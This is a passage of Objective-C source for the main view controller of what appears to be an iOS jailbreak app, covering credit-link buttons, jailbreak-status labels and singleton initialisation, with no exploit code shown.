    } else if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"tweetings://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"tweetings:///user?screen_name=%@", userName]];
    } else if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"twitter://"]]) {
        return [NSURL URLWithString:[NSString stringWithFormat:@"https://mobile.twitter.com/%@", userName]];
    } else {
        return [NSURL URLWithString:[NSString stringWithFormat:@"https://mobile.twitter.com/%@", userName]];
    }
}

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
    sharedController = self;
    if (isJailbroken()) {
        PROGRESS(NSLocalizedString(@"Re-Jailbreak", nil), true, true);
    } else if (!isSupportedByJailbreak()) {
        PROGRESS(NSLocalizedString(@"Unsupported", nil), false, true);
    }
    LOG("Bundled Resources Version: %@", BUNDLEDRESOURCES);
    if (BUNDLEDRESOURCES == nil) {
        showAlert(NSLocalizedString(@"Error", nil), NSLocalizedString(@"Bundled Resources version is missing. This build is invalid.", nil), false, false);
    }
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

- (UIStatusBarStyle)preferredStatusBarStyle {
    return UIStatusBarStyleDefault;
}

- (IBAction)tappedOnPwn:(id)sender{
    [[UIApplication sharedApplication] openURL:[ViewController getURLForUserName:@"Pwn20wnd"] options:@{} completionHandler:nil];
}

- (IBAction)tappedOnDennis:(id)sender{
    [[UIApplication sharedApplication] openURL:[ViewController getURLForUserName:@"DennisBednarz"] options:@{} completionHandler:nil];
}

- (IBAction)tappedOnSamB:(id)sender{
    [[UIApplication sharedApplication] openURL:[ViewController getURLForUserName:@"sbingner"] options:@{} completionHandler:nil];
}

- (IBAction)tappedOnSamG:(id)sender{
    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"https://reddit.com/u/Samg_is_a_Ninja"] options:@{} completionHandler:nil];
}

// This intentionally returns nil if called before it's been created by a proper init
+(ViewController*)sharedController {
    return sharedController;
}

- (id)initWithCoder:(NSCoder *)aDecoder {
    @synchronized(sharedController) {
        if (sharedController == nil) {
            sharedController = [super initWithCoder:aDecoder];
        }
    }
    self = sharedController;
    return self;
}

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil {
    @synchronized(sharedController) {
        if (sharedController == nil) {
            sharedController = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
        }
    }
    self = sharedController;
    return self;
}

- (id)init {
    @synchronized(sharedController) {
        if (sharedController == nil) {
            sharedController = [super init];
        }
    }
    self = sharedController;
    return self;
}

@end

// Don't move this - it is at the bottom so that it will list the total number of upstages
int maxStage = __COUNTER__ - 1;
